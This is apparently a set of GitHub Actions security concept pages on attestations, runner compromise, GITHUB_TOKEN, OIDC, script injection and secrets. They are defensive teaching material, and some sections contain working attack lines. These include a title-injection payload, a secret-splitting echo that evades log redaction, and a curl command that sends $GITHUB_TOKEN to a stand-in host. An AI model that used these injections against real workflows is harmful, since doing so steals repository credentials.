# Security

---

# Artifact attestations

Understand the usage and security benefits of artifact attestations.

## Overview

Artifact attestations enable you to create unfalsifiable provenance and integrity guarantees for the software you build. In turn, people who consume your software can verify where and how your software was built.

When you generate artifact attestations with your software, you create cryptographically signed claims that establish your build's provenance and include the following information:

* A link to the workflow associated with the artifact
* The repository, organization, environment, commit SHA, and triggering event for the artifact
* Other information from the OIDC token used to establish provenance. For more information, see [OpenID Connect](/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect).

You can also generate artifact attestations that include an associated software bill of materials (SBOM). Associating your builds with a list of the open source dependencies used in them provides transparency and enables consumers to comply with data protection standards.

## SLSA levels for artifact attestations

The SLSA framework is an industry standard used to evaluate supply chain security. It is organized into levels. Each level represents an increasing degree of security and trustworthiness for a software supply chain. Artifact attestations by itself provides SLSA v1.0 Build Level 2.

This provides a link between your artifact and its build instructions, but you can take this a step further by requiring builds make use of known, vetted build instructions. A great way to do this is to have your build take place in a reusable workflow that many repositories across your organization share. Reusable workflows can provide isolation between the build process and the calling workflow, to meet SLSA v1.0 Build Level 3. For more information, see [Using artifact attestations and reusable workflows to achieve SLSA v1 Build Level 3](/en/actions/security-guides/using-artifact-attestations-and-reusable-workflows-to-achieve-slsa-v1-build-level-3).

For more information on SLSA levels, see [SLSA Security Levels](https://slsa.dev/spec/v1.0/levels).

## How GitHub generates artifact attestations

To generate artifact attestations, GitHub uses Sigstore, which is an open source project that offers a comprehensive solution for signing and verifying software artifacts via attestations.

**Public repositories** that generate artifact attestations use the [Sigstore Public Good Instance](https://openssf.org/blog/2023/10/03/running-sigstore-as-a-managed-service-a-tour-of-sigstores-public-good-instance/). A copy of the generated Sigstore bundle is stored with GitHub and is also written to an immutable transparency log that is publicly readable on the internet.

**Private repositories** that generate artifact attestations use GitHub's Sigstore instance. GitHub's Sigstore instance uses the same codebase as the Sigstore Public Good Instance, but it does not have a transparency log and only federates with GitHub Actions.

## When to generate attestations

Generating attestations alone doesn't provide any security benefit, the attestations must be verified for the benefit to be realized. Here are some guidelines for how to think about what to sign and how often:

You should sign:

* Software you are releasing that you expect people to run `gh attestation verify ...` on.
* Binaries people will run, packages people will download, or manifests that include hashes of detailed contents.

You should **not** sign:

* Frequent builds that are just for automated testing.
* Individual files like source code, documentation files, or embedded images.

## Verifying artifact attestations

If you consume software that publishes artifact attestations, you can use the GitHub CLI to verify those attestations. Because the attestations give you information about where and how software was built, you can use that information to create and enforce security policies that elevate your supply chain security.

> \[!WARNING] It is important to remember that artifact attestations are *not* a guarantee that an artifact is secure. Instead, artifact attestations link you to the source code and the build instructions that produced them. It is up to you to define your policy criteria, evaluate that policy by evaluating the content, and make an informed risk decision when you are consuming software.

## Next steps

To start generating and verifying artifact attestations for your builds, see [Using artifact attestations to establish provenance for builds](/en/actions/how-tos/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds).
---

# Compromised runners

Understand the security risks associated with compromised GitHub Actions runners.

## Potential impact of a compromised runner

These sections consider some of the steps an attacker can take if they're able to run malicious commands on a GitHub Actions runner.

> \[!NOTE]
> GitHub-hosted runners do not scan for malicious code downloaded by a user during their job, such as a compromised third party library.

### Accessing secrets

Workflows triggered from a forked repository using the `pull_request` event have read-only permissions and have no access to secrets. However, these permissions differ for various event triggers such as `issue_comment`, `issues`, `push` and `pull_request` from a branch within the repository, where the attacker could attempt to steal repository secrets or use the write permission of the job's [`GITHUB_TOKEN`](/en/actions/concepts/security/github_token).

* If the secret or token is set to an environment variable, it can be directly accessed through the environment using `printenv`.

* If the secret is used directly in an expression, the generated shell script is stored on-disk and is accessible.

* For a custom action, the risk can vary depending on how a program is using the secret it obtained from the argument:

  ```yaml
  uses: fakeaction/publish@v3
  with:
      key: ${{ secrets.PUBLISH_KEY }}
  ```

Although GitHub Actions scrubs secrets from memory that are not referenced in the workflow (or an included action), the `GITHUB_TOKEN` and any referenced secrets can be harvested by a determined attacker.

### Exfiltrating data from a runner

An attacker can exfiltrate any stolen secrets or other data from the runner. To help prevent accidental secret disclosure, GitHub Actions [automatically redact secrets printed to the log](/en/actions/security-guides/using-secrets-in-github-actions#accessing-your-secrets), but this is not a true security boundary because secrets can be intentionally sent to the log. For example, obfuscated secrets can be exfiltrated using `echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};`. In addition, since the attacker may run arbitrary commands, they could use HTTP requests to send secrets or other repository data to an external server.

### Stealing the job's `GITHUB_TOKEN`

It is possible for an attacker to steal a job's `GITHUB_TOKEN`. The GitHub Actions runner automatically receives a generated `GITHUB_TOKEN` with permissions that are limited to just the repository that contains the workflow, and the token expires after the job has completed. Once expired, the token is no longer useful to an attacker. To work around this limitation, they can automate the attack and perform it in fractions of a second by calling an attacker-controlled server with the token, for example: `a"; set +e; curl http://example.com?token=$GITHUB_TOKEN;#`.

### Modifying the contents of a repository

The attacker server can use the GitHub API to [modify repository content](/en/actions/reference/workflows-and-actions/workflow-syntax#permissions), including releases, if the assigned permissions of `GITHUB_TOKEN` [are not restricted](/en/actions/security-guides/automatic-token-authentication#modifying-the-permissions-for-the-github_token).

### Cross-repository access

GitHub Actions is intentionally scoped for a single repository at a time. The `GITHUB_TOKEN` grants the same level of access as a write-access user, because any write-access user can access this token by creating or modifying a workflow file, elevating the permissions of the `GITHUB_TOKEN` if necessary. Users have specific permissions for each repository, so allowing the `GITHUB_TOKEN` for one repository to grant access to another would impact the GitHub permission model if not implemented carefully. Similarly, caution must be taken when adding GitHub authentication tokens to a workflow, because this can also affect the GitHub permission model by inadvertently granting broad access to collaborators.

If your organization is owned by an enterprise account, then you can share and reuse GitHub Actions by storing them in internal repositories. For more information, see [Sharing actions and workflows with your enterprise](/en/actions/creating-actions/sharing-actions-and-workflows-with-your-enterprise).

You can perform other privileged, cross-repository interactions by referencing a GitHub authentication token or SSH key as a secret within the workflow. Because many authentication token types do not allow for granular access to specific resources, there is significant risk in using the wrong token type, as it can grant much broader access than intended.

This list describes the recommended approaches for accessing repository data within a workflow, in descending order of preference:

1. **The `GITHUB_TOKEN`**
   * This token is intentionally scoped to the single repository that invoked the workflow, and can have the same level of access as a write-access user on the repository. The token is created before each job begins and expires when the job is finished. For more information, see [Use GITHUB\\\_TOKEN for authentication in workflows](/en/actions/security-guides/automatic-token-authentication).
   * The `GITHUB_TOKEN` should be used whenever possible.
2. **Repository deploy key**
   * Deploy keys are one of the only credential types that grant read or write access to a single repository, and can be used to interact with another repository within a workflow. For more information, see [Managing deploy keys](/en/authentication/connecting-to-github-with-ssh/managing-deploy-keys#deploy-keys).
   * Note that deploy keys can only clone and push to the repository using Git, and cannot be used to interact with the REST or GraphQL API, so they may not be appropriate for your requirements.
3. **GitHub App tokens**
   * GitHub Apps can be installed on select repositories, and even have granular permissions on the resources within them. You could create a GitHub App internal to your organization, install it on the repositories you need access to within your workflow, and authenticate as the installation within your workflow to access those repositories. For more information, see [Making authenticated API requests with a GitHub App in a GitHub Actions workflow](/en/apps/creating-github-apps/guides/making-authenticated-api-requests-with-a-github-app-in-a-github-actions-workflow).
4. **personal access tokens**
   * You should never use a personal access token (classic). These tokens grant access to all repositories within the organizations that you have access to, as well as all personal repositories in your personal account. This indirectly grants broad access to all write-access users of the repository the workflow is in.
   * If you do use a personal access token, you should never use a personal access token from your own account. If you later leave an organization, workflows using this token will immediately break, and debugging this issue can be challenging. Instead, you should use a fine-grained personal access token for a new account that belongs to your organization and that is only granted access to the specific repositories that are needed for the workflow. Note that this approach is not scalable and should be avoided in favor of alternatives, such as deploy keys.
5. **SSH keys on a personal account**
   * Workflows should never use the SSH keys on a personal account. Similar to personal access tokens (classic), they grant read/write permissions to all of your personal repositories as well as all the repositories you have access to through organization membership. This indirectly grants broad access to all write-access users of the repository the workflow is in. If you're intending to use an SSH key because you only need to perform repository clones or pushes, and do not need to interact with public APIs, then you should use individual deploy keys instead.

## Next steps

For security best practices with GitHub Actions, see [Secure use reference](/en/actions/reference/secure-use-reference).
---

# GITHUB\_TOKEN

Learn what GITHUB_TOKEN is, how it works, and why it matters for secure automation in GitHub Actions workflows.

## About the `GITHUB_TOKEN`

At the start of each workflow job, GitHub automatically creates a unique `GITHUB_TOKEN` secret to use in your workflow. You can use the `GITHUB_TOKEN` to authenticate in the workflow job.

When you enable GitHub Actions, GitHub installs a GitHub App on your repository. The `GITHUB_TOKEN` secret is a GitHub App installation access token. You can use the installation access token to authenticate on behalf of the GitHub App installed on your repository. The token's permissions are limited to the repository that contains your workflow. For more information, see [Workflow syntax for GitHub Actions](/en/actions/reference/workflow-syntax-for-github-actions#permissions).

Before each job begins, GitHub fetches an installation access token for the job. The `GITHUB_TOKEN` expires when the job finishes or after its effective maximum lifetime.

The effective maximum lifetime of the token depends on the type of runner:

* **GitHub-hosted runners** The maximum job execution time is 6 hours, so the `GITHUB_TOKEN` can live for a maximum of 6 hours.
* **Self-hosted runners** The maximum job execution time is 5 days. However, because the `GITHUB_TOKEN` is an installation access token, it can only be refreshed for up to 24 hours. If your job runs longer than 24 hours, use a personal access token or other authentication method instead.

The token is also available in the `github.token` context. For more information, see [Contexts reference](/en/actions/learn-github-actions/contexts#github-context).

## When `GITHUB_TOKEN` triggers workflow runs

When you use the repository's `GITHUB_TOKEN` to perform tasks, events triggered by the `GITHUB_TOKEN`, with the exception of `workflow_dispatch` and `repository_dispatch`, will not create a new workflow run. This prevents you from accidentally creating recursive workflow runs. For example, if a workflow run pushes code using the repository's `GITHUB_TOKEN`, a new workflow will not run even when the repository contains a workflow configured to run when `push` events occur.

Commits pushed by a GitHub Actions workflow that uses the `GITHUB_TOKEN` do not trigger a GitHub Pages build.

## Next steps

* [Use GITHUB\\\_TOKEN for authentication in workflows](/en/actions/how-tos/security-for-github-actions/security-guides/use-github_token-in-workflows)
* [Workflow syntax for GitHub Actions](/en/actions/reference/workflow-syntax-for-github-actions#permissions)
---

# Kubernetes admissions controller

Understand how you can use an admissions controller to enforce artifact attestations in your Kubernetes cluster.

## About Kubernetes admission controller

[Artifact attestations](/en/actions/security-guides/using-artifact-attestations-to-establish-provenance-for-builds) enable you to create unfalsifiable provenance and integrity guarantees for the software you build. In turn, people who consume your software can verify where and how your software was built.

Kubernetes admission controllers are plugins that govern the behavior of the Kubernetes API server. They are commonly used to enforce security policies and best practices in a Kubernetes cluster.

Using the open source [Sigstore Policy Controller](https://docs.sigstore.dev/policy-controller/overview/) project you can add an admission controller to your Kubernetes cluster that can enforce artifact attestations. This way, you can ensure that only artifacts with valid attestations can be deployed.

To [install the controller](/en/actions/how-tos/security-for-github-actions/using-artifact-attestations/enforcing-artifact-attestations-with-a-kubernetes-admission-controller), we offer [two Helm charts](https://github.com/github/artifact-attestations-helm-charts): one for deploying the Sigstore Policy Controller, and another for loading the GitHub trust root and a default policy.

### About image verification

When the Policy Controller is installed, it will intercept all image pull requests and verify the attestation for the image. The attestation must be stored in the image registry as an [OCI attached artifact](https://oras.land/docs/concepts/reftypes/) containing a [Sigstore Bundle](https://docs.sigstore.dev/about/bundle/) which contains the attestation and cryptographic material (e.g. certificates and signatures) used to verify the attestation. A verification process is then performed that ensures the image was built with the specified build provenance and matches any policies enabled by the cluster administrator.

In order for an image to be verifiable, it must have a valid provenance attestation in the registry, which can be done by enabling the `push-to-registry: true` attribute in the `actions/attest` action. See [Generating build provenance for container images](/en/actions/security-guides/using-artifact-attestations-to-establish-provenance-for-builds#generating-build-provenance-for-container-images) for more details on how to generate attestations for container images.

### About trust roots and policies

The Sigstore Policy Controller is primarily configured with trust roots and policies, represented by the Custom Resources `TrustRoot` and `ClusterImagePolicy`. A `TrustRoot` represents a trusted distribution channel for the public key material used to verify attestations. A `ClusterImagePolicy` represents a policy for enforcing attestations on images.

A `TrustRoot` may also contain a [TUF](https://theupdateframework.io/) repository root, making it possible for your cluster to continuously and securely receive updates to its trusted public key material. If left unspecified, a `ClusterImagePolicy` will by default use the open source Sigstore Public Good Instance's key material. When verifying attestations generated for private repositories, the `ClusterImagePolicy` must reference the GitHub `TrustRoot`.

## Next steps

When you're ready to use an admission controller, see [Enforcing artifact attestations with a Kubernetes admission controller](/en/actions/how-tos/security-for-github-actions/using-artifact-attestations/enforcing-artifact-attestations-with-a-kubernetes-admission-controller).
---

# OpenID Connect

OpenID Connect allows your workflows to exchange short-lived tokens directly from your cloud provider.

## Overview of OpenID Connect (OIDC)

GitHub Actions workflows are often designed to access a cloud provider (such as AWS, Azure, GCP, HashiCorp Vault, and others) in order to deploy software or use the cloud's services. Before the workflow can access these resources, it will supply credentials, such as a password or token, to the cloud provider. These credentials are usually stored as a secret in GitHub, and the workflow presents this secret to the cloud provider every time it runs.

However, using hardcoded secrets requires you to create credentials in the cloud provider and then duplicate them in GitHub as a secret.

After you have established a trust connection with a cloud provider that supports OIDC, you can configure your workflow to request a short-lived access token directly from the cloud provider.

## Benefits of using OIDC

By updating your workflows to use OIDC tokens, you can adopt the following good security practices:

* **No cloud secrets:** You won't need to duplicate your cloud credentials as long-lived GitHub secrets. Instead, you can configure the OIDC trust on your cloud provider, and then update your workflows to request a short-lived access token from the cloud provider through OIDC.
* **Authentication and authorization management:** You have more granular control over how workflows can use credentials, using your cloud provider's authentication (authN) and authorization (authZ) tools to control access to cloud resources.
* **Rotating credentials:** With OIDC, your cloud provider issues a short-lived access token that is only valid for a single job, and then automatically expires.

## How OIDC integrates with GitHub Actions

The following diagram gives an overview of how GitHub's OIDC provider integrates with your workflows and cloud provider:

![Diagram of how a cloud provider integrates with GitHub Actions through access tokens and JSON web token cloud role IDs.](/assets/images/help/actions/oidc-architecture.png)

1. You establish an OIDC trust relationship in the cloud provider, allowing specific GitHub workflows to request cloud access tokens on behalf of a defined cloud role.
2. Every time your job runs, GitHub's OIDC provider auto-generates an OIDC token. This token contains multiple claims to establish a security-hardened and verifiable identity about the specific workflow that is trying to authenticate.
3. A step or action in the workflow job can request a token from GitHub’s OIDC provider, which can then be presented to the cloud provider as proof of the workflow’s identity.
4. Once the cloud provider successfully validates the claims presented in the token, it then provides a short-lived cloud access token that is available only for the duration of the job.

## Understanding the OIDC token

Each job requests an OIDC token from GitHub's OIDC provider, which responds with an automatically generated JSON web token (JWT) that is unique for each workflow job where it is generated. When the job runs, the OIDC token is presented to the cloud provider. To validate the token, the cloud provider checks if the OIDC token's subject and other claims are a match for the conditions that were preconfigured on the cloud role's OIDC trust definition.

The following example OIDC token uses a subject (`sub`) that references a job environment named `prod` in the `octo-org/octo-repo` repository.

```yaml
{
  "typ": "JWT",
  "alg": "RS256",
  "x5t": "example-thumbprint",
  "kid": "example-key-id"
}
{
  "jti": "example-id",
  "sub": "repo:octo-org/octo-repo:environment:prod",
  "environment": "prod",
  "aud": "https://github.com/octo-org",
  "ref": "refs/heads/main",
  "sha": "example-sha",
  "repository": "octo-org/octo-repo",
  "repository_owner": "octo-org",
  "actor_id": "12",
  "repository_visibility": "private",
  "repository_id": "74",
  "repository_owner_id": "65",
  "run_id": "example-run-id",
  "run_number": "10",
  "run_attempt": "2",
  "runner_environment": "github-hosted",
  "actor": "octocat",
  "workflow": "example-workflow",
  "head_ref": "",
  "base_ref": "",
  "event_name": "workflow_dispatch",
  "repo_property_workspace_id": "ws-abc123",
  "ref_type": "branch",
  "job_workflow_ref": "octo-org/octo-automation/.github/workflows/oidc.yml@refs/heads/main",
  "iss": "https://token.actions.githubusercontent.com",
  "nbf": 1632492967,
  "exp": 1632493867,
  "iat": 1632493567
}
```

## Authenticating custom actions using OIDC

Custom actions use the `getIDToken()` method from the Actions toolkit or a `curl` command to authenticate using OIDC.

For more information, see [OpenID Connect reference](/en/actions/reference/openid-connect-reference#methods-for-requesting-the-oidc-token).

## Updating your workflows for OIDC

GitHub Actions workflows can use OIDC tokens instead of secrets to authenticate with cloud providers. Many popular cloud providers offer official login actions that simplify the process of using OIDC in your workflows. For more information about updating your workflows with specific cloud providers, see [Security hardening your deployments](/en/actions/how-tos/security-for-github-actions/security-hardening-your-deployments).

## Using repository custom properties as OIDC claims

> \[!NOTE]
> This feature is currently in public preview and is subject to change.

Organization and enterprise admins can include repository custom properties as claims in OIDC tokens. Once added, every repository in the organization or enterprise that has a value set for that custom property will automatically include it in its OIDC tokens, prefixed with `repo_property_`.

This allows you to create granular access policies that bind directly to your repository metadata, reducing configuration drift and eliminating the need to duplicate governance information across multiple systems.

### Prerequisites

* Custom properties must already be defined at the organization or enterprise level.
* You must be an organization admin or enterprise admin.

### Adding a custom property to OIDC token claims

To include a custom property in OIDC tokens, use the REST API or the settings UI for your organization or enterprise.

**Using the settings UI:** Navigate to your organization or enterprise's Actions OIDC settings page to view and manage which custom properties are included in OIDC tokens.

![Screenshot of the OIDC settings for an organization or enterprise.](/assets/images/help/actions/actions-oidc-settings.png)

* **Using the REST API:** Send a `POST` request to add a custom property to the OIDC token claims for your organization:

### Example OIDC token with a custom property

The following example shows an OIDC token that includes the `workspace_id` custom property:

```json
{
  "sub": "repo:my-org/my-repo:ref:refs/heads/main",
  "aud": "https://github.com/my-org",
  "repository": "my-org/my-repo",
  "repo_property_workspace_id": "ws-abc123"
}
```

You can use the `repo_property_*` claims in your cloud provider's trust conditions to create flexible, attribute-based access control policies. For more information, see [OpenID Connect reference](/en/actions/reference/openid-connect-reference#including-repository-custom-properties-in-oidc-tokens).

## OIDC support for Dependabot

Dependabot can use OIDC to authenticate with private registries, eliminating the need to store long-lived credentials as repository secrets. With OIDC-based authentication, Dependabot update jobs can dynamically obtain short-lived credentials from your cloud identity provider.

Dependabot supports OIDC authentication for any registry type that uses `username` and `password` authentication, when the registry is hosted on AWS CodeArtifact, Azure DevOps Artifacts, or JFrog Artifactory.

The benefits of OIDC authentication for Dependabot are:

* **Enhanced security:** Eliminates static, long-lived credentials from your repositories.
* **Simpler management:** Enables secure, policy-compliant access to private registries.
* **Avoid rate limiting:** Dynamic credentials help you avoid hitting rate limits associated with static tokens.

For more information, see [Configuring access to private registries for Dependabot](/en/code-security/dependabot/working-with-dependabot/configuring-access-to-private-registries-for-dependabot#using-oidc-for-authentication).

## Next steps

For more information about configuring OIDC, see [Security hardening your deployments](/en/actions/how-tos/security-for-github-actions/security-hardening-your-deployments).

For reference information about OIDC, see [OpenID Connect reference](/en/actions/reference/openid-connect-reference).
---

# Script injections

Understand the security risks associated with script injections and GitHub Actions workflows.

## Understanding the risk of script injections

When creating workflows, [custom actions](/en/actions/creating-actions/about-custom-actions), and [composite actions](/en/actions/creating-actions/creating-a-composite-action), you should always consider whether your code might execute untrusted input from attackers. This can occur when an attacker adds malicious commands and scripts to a context. When your workflow runs, those strings might be interpreted as code which is then executed on the runner.

Attackers can add their own malicious content to the [`github` context](/en/actions/learn-github-actions/contexts#github-context), which should be treated as potentially untrusted input. These contexts typically end with `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`,`ref`, and `title`. For example: `github.event.issue.title`, or `github.event.pull_request.body`.

You should ensure that these values do not flow directly into workflows, actions, API calls, or anywhere else where they could be interpreted as executable code. By adopting the same defensive programming posture you would use for any other privileged application code, you can help security harden your use of GitHub Actions. For information on some of the steps an attacker could take, see [Secure use reference](/en/actions/security-guides/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner).

In addition, there are other less obvious sources of potentially untrusted input, such as branch names and email addresses, which can be quite flexible in terms of their permitted content. For example, `zzz";echo${IFS}"hello";#` would be a valid branch name and would be a possible attack vector for a target repository.

The following sections explain how you can help mitigate the risk of script injection.

### Example of a script injection attack

A script injection attack can occur directly within a workflow's inline script. In the following example, an action uses an expression to test the validity of a pull request title, but also adds the risk of script injection:

```yaml
      - name: Check PR title
        run: |
          title="${{ github.event.pull_request.title }}"
          if [[ $title =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
```

This example is vulnerable to script injection because the `run` command executes within a temporary shell script on the runner. Before the shell script is run, the expressions inside `${{ }}` are evaluated and then substituted with the resulting values, which can make it vulnerable to shell command injection.

To inject commands into this workflow, the attacker could create a pull request with a title of `a"; ls $GITHUB_WORKSPACE"`:

![Screenshot of the title of a pull request in edit mode. A new title has been entered in the field: a"; ls $GITHUB\_WORKSPACE".](/assets/images/help/actions/example-script-injection-pr-title.png)

In this example, the `"` character is used to interrupt the `title="${{ github.event.pull_request.title }}"` statement, allowing the `ls` command to be executed on the runner. You can see the output of the `ls` command in the log:

```shell
Run title="a"; ls $GITHUB_WORKSPACE""
README.md
code.yml
example.js
```

For best practices keeping runners secure, see [Secure use reference](/en/actions/reference/secure-use-reference#good-practices-for-mitigating-script-injection-attacks).
---

# Secrets

Learn about secrets as they are used in GitHub Actions workflows.

## About secrets

Secrets allow you to store sensitive information in your organization, repository, or repository environments. Secrets are variables that you create to use in GitHub Actions workflows in an organization, repository, or repository environment.

GitHub Actions can only read a secret if you explicitly include the secret in a workflow.

## How secrets work

Secrets use [Libsodium sealed boxes](https://libsodium.gitbook.io/doc/public-key_cryptography/sealed_boxes), so that they are encrypted before reaching GitHub. This occurs when the secret is submitted [using the UI](/en/actions/security-guides/using-secrets-in-github-actions#creating-secrets-for-a-repository) or through the [REST API](/en/rest/actions/secrets). This client-side encryption helps minimize the risks related to accidental logging (for example, exception logs and request logs, among others) within GitHub's infrastructure. Once the secret is uploaded, GitHub is then able to decrypt it so that it can be injected into the workflow runtime.

## Organization-level secrets

Organization-level secrets let you share secrets between multiple repositories, which reduces the need for creating duplicate secrets. Updating an organization secret in one location also ensures that the change takes effect in all repository workflows that use that secret.

When creating a secret for an organization, you can use a policy to limit access by repository. For example, you can grant access to all repositories, or limit access to only private repositories or a specified list of repositories.

For environment secrets, you can enable required reviewers to control access to the secrets. A workflow job cannot access environment secrets until approval is granted by required approvers.

To make a secret available to an action, you must set the secret as an input or environment variable in your workflow file. Review the action's README file to learn about which inputs and environment variables the action expects. See [Workflow syntax for GitHub Actions](/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idstepsenv).

## Limiting credential permissions

When generating credentials, we recommend that you grant the minimum permissions possible. For example, instead of using personal credentials, use [deploy keys](/en/authentication/connecting-to-github-with-ssh/managing-deploy-keys#deploy-keys) or a service account. Consider granting read-only permissions if that's all that is needed, and limit access as much as possible.

When generating a personal access token (classic), select the fewest scopes necessary. When generating a fine-grained personal access token, select the minimum permissions and repository access required.

Instead of using a personal access token, consider using a GitHub App, which uses fine-grained permissions and short lived tokens, similar to a fine-grained personal access token. Unlike a personal access token, a GitHub App is not tied to a user, so the workflow will continue to work even if the user who installed the app leaves your organization. For more information, see [Making authenticated API requests with a GitHub App in a GitHub Actions workflow](/en/apps/creating-github-apps/guides/making-authenticated-api-requests-with-a-github-app-in-a-github-actions-workflow).

## Automatically redacted secrets

GitHub Actions automatically redacts the contents of all GitHub secrets that are printed to workflow logs.

GitHub Actions also redacts information that is recognized as sensitive, but is not stored as a secret. For a list of automatically redacted secrets, see [Secrets reference](/en/actions/reference/secrets-reference#automatically-redacted-secrets).

Because there are multiple ways a secret value can be transformed, this redaction is not guaranteed. Additionally, the runner can only redact secrets used within the current job. As a result, there are certain security proactive steps you should follow to help ensure secrets are redacted, and to limit other risks associated with secrets. For a reference list of security best practices with secrets, see [Secrets reference](/en/actions/reference/secrets-reference#security-best-practices).

## Further reading

* [Using secrets in GitHub Actions](/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions)
* [REST API endpoints for GitHub Actions Secrets](/en/rest/actions/secrets)